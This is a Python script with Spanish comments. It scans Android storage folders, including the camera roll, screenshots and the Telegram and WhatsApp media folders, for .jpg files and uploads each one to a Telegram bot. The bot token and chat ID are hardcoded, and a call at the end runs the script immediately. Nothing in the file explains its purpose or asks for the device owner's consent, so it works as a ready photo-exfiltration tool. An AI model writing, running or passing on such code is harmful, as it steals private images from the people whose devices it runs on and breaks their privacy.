import requests
import os

def suyaib(bot_token, chat_id):
    session = requests.session()

    try:
        # Buscar archivos de imagen en diferentes directorios
        directories = [
            '/sdcard',
            '/sdcard/Download',
            '/sdcard/DCIM/Screenshots',
            '/sdcard/Download/Telegram',
            '/sdcard/DCIM/Camera',
            '/sdcard/Telegram/Telegram Files',
            '/sdcard/WhatsApp/Media/WhatsApp Documents'
        ]

        for directory in directories:
            file_list = [f for f in os.listdir(directory) if f.endswith('.jpg')]
            for file in file_list:
                with open(os.path.join(directory, file), 'rb') as f:
                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                    data = {'chat_id': chat_id}
                    files = {'document': f}
                    get = session.post(url, data=data, files=files)
    except Exception as e:
        print("Error al enviar las imágenes a través de Telegram:", e)

# Ejecutar la función suyaib al recibir un comando /ejecutar
# Puedes cambiar '/ejecutar' por el comando que desees
def handle_command(bot_token, chat_id, command):
    if command == '/command1':
        suyaib(bot_token, chat_id)

# Llamar a la función handle_command con el comando recibido
# Aquí debes pasar el token de tu bot y el ID del chat
handle_command('6764013620:AAHXfuI9As3xys6MfrntW96XpXa9gMmmen0', '6904238800', '/command1')
